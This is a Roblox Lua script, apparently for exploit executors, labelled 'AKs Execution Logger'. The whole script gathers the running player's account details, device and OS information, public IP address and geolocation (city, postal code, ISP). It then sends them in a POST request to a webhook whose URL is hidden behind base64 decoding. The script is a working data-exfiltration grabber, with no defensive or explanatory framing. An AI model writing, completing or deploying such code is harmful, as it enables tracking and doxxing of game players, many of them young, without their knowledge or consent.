-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local UserInputService = game:GetService("UserInputService")
local TelemetryService = game:GetService("TelemetryService")
local GamepadService = game:GetService("GamepadService")
local Camera = workspace.CurrentCamera
local GuiService = game:GetService("GuiService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local IsStudio = game.GameId == "studio"
local IsChatEnabled = game:GetService("Chat").Enabled
local UserEmotes = LocalPlayer.Emotes:GetEmotes()  -- Get all user emotes

-- Device Info
local IsUsingGamepad = UserInputService:IsGamepadConnected(1)
local IsMouseConnected = UserInputService.MouseEnabled
local IsTouchEnabled = UserInputService.TouchEnabled
local ScreenSize = Vector2.new(workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y)
local DeviceModel = game:GetService("UserInputService"):GetDeviceModel()

-- Camera Info
local CameraPosition = Camera.CFrame.Position
local CameraOrientation = Camera.CFrame.LookVector

-- System Info (Device and OS)
local Device = UserInputService:GetPlatform()
local IsVR = UserInputService.VREnabled
local OS = game:GetService("UserInputService").OperatingSystem
local BrowserVersion = game:GetService("UserInputService"):GetBrowserVersion()

-- Base64 Decoding Function
local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Helper Functions
local function safeHttpGet(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        return response
    else
        warn("Failed to retrieve data from " .. url)
        return nil
    end
end

local function formatPlayerLink(userId)
    return "https://www.roblox.com/users/" .. userId
end

local function formatGameLink(placeId)
    return "https://www.roblox.com/games/" .. placeId
end

local function getPlayerGameData()
    return {
        GameId = game.GameId,
        PlaceId = game.PlaceId,
        JobId = game.JobId,
        GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
        GameLink = formatGameLink(game.PlaceId)
    }
end

-- Obfuscated Webhook URL
local encodedWebhookUrl = ""
local webhookUrl = base64Decode(encodedWebhookUrl)

-- Data Retrieval
local GetIp = safeHttpGet("https://v4.ident.me/") or "Unavailable"
local GetData = safeHttpGet("http://ip-api.com/json")
local IpData = GetData and HttpService:JSONDecode(GetData) or {}

-- Webhook Data Creation
local function createWebhookData()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local playerLink = formatPlayerLink(UserId)
    local gameData = getPlayerGameData()
    local mobileJoinLink = formatGameLink(gameData.PlaceId) .. "/start?placeId=" .. gameData.PlaceId .. "&launchData=" .. gameData.JobId
    local jobIdLink = formatGameLink(gameData.PlaceId) .. "?jobId=" .. gameData.JobId

    -- Emotes Info
    local emotes = ""
    for _, emote in ipairs(UserEmotes) do
        emotes = emotes .. emote.Name .. "\n"
    end

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", gameData.GameName, gameData.GameLink, gameData.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Is Studio:** %s\n**Chat Enabled:** %s\n**Emotes:**\n%s",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, tostring(IsStudio), tostring(IsChatEnabled), emotes
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, IpData.country or "Unknown", string.lower(IpData.countryCode or ""), 
                    IpData.regionName or "Unknown", IpData.city or "Unknown", IpData.zip or "Unknown", 
                    IpData.isp or "Unknown", IpData.org or "Unknown", IpData.timezone or "Unknown"
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "📱 Device & System Info",
                description = string.format(
                    "**Device Model:** %s\n**Platform:** %s\n**Screen Size:** %.0f x %.0f\n**Is VR:** %s\n**OS:** %s\n**Browser Version:** %s\n**Gamepad Connected:** %s\n**Mouse Connected:** %s\n**Touch Enabled:** %s",
                    DeviceModel, Device, ScreenSize.X, ScreenSize.Y, tostring(IsVR), OS, BrowserVersion, tostring(IsUsingGamepad), tostring(IsMouseConnected), tostring(IsTouchEnabled)
                ),
                color = tonumber("0x95a5a6")
            },
            {
                title = "⚙️ Camera & Environment Info",
                description = string.format(
                    "**Camera Position:** (%.2f, %.2f, %.2f)\n**Camera Orientation:** (%.2f, %.2f, %.2f)",
                    CameraPosition.X, CameraPosition.Y, CameraPosition.Z,
                    CameraOrientation.X, CameraOrientation.Y, CameraOrientation.Z
                ),
                color = tonumber("0x9b59b6"),
                footer = { text = string.format("📅 Date: %s | ⏰ Time: %s", date, time) }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Send Webhook Function
local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}

    local success, result = pcall(function()
        return request(webhookRequest)
    end)

    if success and result.StatusCode == 200 then
        print("Webhook sent successfully.")
    else
        warn("Failed to send webhook: " .. (result and result.StatusMessage or "Unknown error"))
    end
end

-- Execute
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
